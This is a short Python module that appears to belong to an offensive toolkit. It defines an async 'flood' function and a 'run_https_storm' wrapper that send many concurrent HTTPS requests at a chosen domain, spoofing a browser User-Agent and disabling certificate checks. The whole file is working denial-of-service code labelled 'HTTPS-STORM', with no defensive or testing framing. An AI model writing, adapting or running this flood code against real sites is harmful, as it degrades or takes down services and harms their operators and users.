import httpx
import asyncio

async def flood(domain, num_requests=100):
    url = f"https://{domain}/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0.0.0"
    }
    async with httpx.AsyncClient(http2=True, verify=False) as client:
        tasks = [client.get(url, headers=headers) for _ in range(num_requests)]
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        success = sum(1 for r in responses if isinstance(r, httpx.Response) and r.status_code < 500)
        fail = len(responses) - success
        print(f"[HTTPS-STORM] Completed {num_requests} requests — Success: {success}, Failures: {fail}")

def run_https_storm(domain):
    print(f"[+] Running HTTPS-STORM on {domain}")
    try:
        asyncio.run(flood(domain))
    except Exception as e:
        print(f"[!] HTTPS-STORM error: {e}")
